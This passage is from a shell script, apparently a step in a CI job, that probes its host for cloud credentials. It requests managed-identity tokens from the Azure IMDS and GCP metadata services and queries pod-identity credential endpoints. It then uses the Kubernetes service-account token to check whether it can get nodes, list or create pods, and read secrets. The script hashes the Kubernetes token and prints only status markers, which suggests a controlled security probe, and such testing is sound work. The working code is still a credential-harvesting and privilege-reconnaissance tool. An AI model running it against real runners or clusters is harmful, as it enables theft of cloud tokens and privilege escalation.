            SAFE=$(echo "$EP" | tr '.' '_')
            H=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_$SAFE -w '%{http_code}' "http://$EP/v1/credentials" 2>/dev/null)
            echo "PODID_${SAFE}_CRED_HTTP=$H BYTES=$(wc -c </tmp/podid_$SAFE 2>/dev/null | tr -d ' ')"
            [ "$H" = "200" ] && parse_json_keys /tmp/podid_$SAFE PODID_$SAFE
            HB=$(curl -sS -m 5 --connect-timeout 3 -o /tmp/podid_${SAFE}_b -w '%{http_code}' "http://$EP/v1/credentials-c211bogus" 2>/dev/null)
            echo "PODID_${SAFE}_BOGUS_HTTP=$HB"
          done

          echo "=== AZURE_IMDS ==="
          AZ_URL='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
          AZ=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok -w '%{http_code}' "$AZ_URL" 2>/dev/null)
          echo "AZURE_IMDS_HTTP=$AZ BYTES=$(wc -c </tmp/aztok 2>/dev/null | tr -d ' ')"
          [ "$AZ" = "200" ] && parse_json_keys /tmp/aztok AZURE_IMDS
          AZB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata: true' -o /tmp/aztok_b -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token-c211bogus?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)
          echo "AZURE_IMDS_BOGUS_HTTP=$AZB"

          echo "=== GCP_METADATA ==="
          for GH in metadata.google.internal 169.254.169.254; do
            SAFE=$(echo "$GH" | tr '.' '_')
            G=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_$SAFE -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
            echo "GCP_${SAFE}_TOKEN_HTTP=$G BYTES=$(wc -c </tmp/gcp_$SAFE 2>/dev/null | tr -d ' ')"
            [ "$G" = "200" ] && parse_json_keys /tmp/gcp_$SAFE GCP_${SAFE}
            GB=$(curl -sS -m 5 --connect-timeout 3 -H 'Metadata-Flavor: Google' -o /tmp/gcp_${SAFE}_b -w '%{http_code}' "http://$GH/computeMetadata/v1/instance/service-accounts/default/token-c211bogus" 2>/dev/null)
            echo "GCP_${SAFE}_BOGUS_HTTP=$GB"
          done

          echo "=== K8S_RBAC ==="
          SA="${C211_SA_DIR:-/var/run/secrets/kubernetes.io/serviceaccount}"
          if [ -f "$SA/token" ]; then
            read -r N S <<<"$(hashval $SA/token)"
            echo "K8S_SA_TOKEN_PRESENT=yes bytes=$N sha256=$S"
            echo "K8S_SA_NAMESPACE=$(head -c 200 $SA/namespace 2>/dev/null)"
            echo "K8S_SA_CA_PRESENT=$([ -f $SA/ca.crt ] && echo yes || echo no)"
            KHOST=${KUBERNETES_SERVICE_HOST:-}
            KPORT=${KUBERNETES_SERVICE_PORT:-443}
            if [ -n "$KHOST" ]; then
              KURL="https://$KHOST:$KPORT"
              if [ -f "$SA/ca.crt" ]; then CAARG="--cacert $SA/ca.crt"; else CAARG="-k"; fi
              NS=$(cat $SA/namespace 2>/dev/null)
              TOK=$(cat $SA/token 2>/dev/null)
              echo "K8S_API=$KURL NS=$NS"
              SSRR_CODE=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' -o /tmp/ssrr.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)
              echo "K8S_SSRR_HTTP=$SSRR_CODE"
              if [ "$SSRR_CODE" = "201" ] && command -v python3 >/dev/null 2>&1; then
                python3 - <<'PY'
          import json
          try:
              d=json.load(open('/tmp/ssrr.json'))
          except Exception:
              print('K8S_SSRR_PARSE_FAIL'); raise SystemExit
          rules=(d.get('status') or {}).get('resourceRules') or []
          got={}
          for r in rules:
              verbs=r.get('verbs') or []
              res=r.get('resources') or []
              for rn in ('nodes','pods','secrets'):
                  for v in ('get','list','create'):
                      if ('*' in res or rn in res or (rn+'/*') in res) and ('*' in verbs or v in verbs):
                          got[(v,rn)]=True
          for v in ('get','list','create'):
              for rn in ('nodes','pods','secrets'):
                  print('K8S_SSRR_%s_%s=%s'%(v,rn,'true' if got.get((v,rn)) else 'false'))
          print('K8S_SSRR_RULES=%d'%len(rules))
          PY
              fi
              ssar() {
                local name="$1" verb="$2" res="$3" ns="$4"
                local body
                if [ -n "$ns" ]; then
                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'","namespace":"'"$ns"'"}}}'
                else
                  body='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"'"$verb"'","resource":"'"$res"'"}}}'
                fi
                local code
                code=$(curl -sS -m 6 --connect-timeout 3 $CAARG -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X POST --data "$body" -o /tmp/ssar_$name.json -w '%{http_code}' "$KURL/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
                local allowed=unknown
                if [ "$code" = "201" ] && command -v python3 >/dev/null 2>&1; then
                  allowed=$(python3 -c "import json;d=json.load(open('/tmp/ssar_$name.json'));print(str((d.get('status') or {}).get('allowed')).lower())" 2>/dev/null)
                fi
                echo "K8S_SSAR_${name}_HTTP=$code allowed=$allowed"
              }
              ssar get_nodes get nodes ""
              ssar list_pods list pods "$NS"
              ssar create_pods create pods "$NS"
            else
              echo "K8S_API_ENV_ABSENT"
            fi
          else
            echo "K8S_SA_TOKEN_PRESENT=no"
          fi

          echo "K8S_NO_POD_CREATED=confirmed"
          echo "HOST_WRITE_NONE=confirmed"
          echo "=== END_STATE ==="
          echo "TS_END=$(ts)"
          echo "C211_NVMETA_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
          exit 0
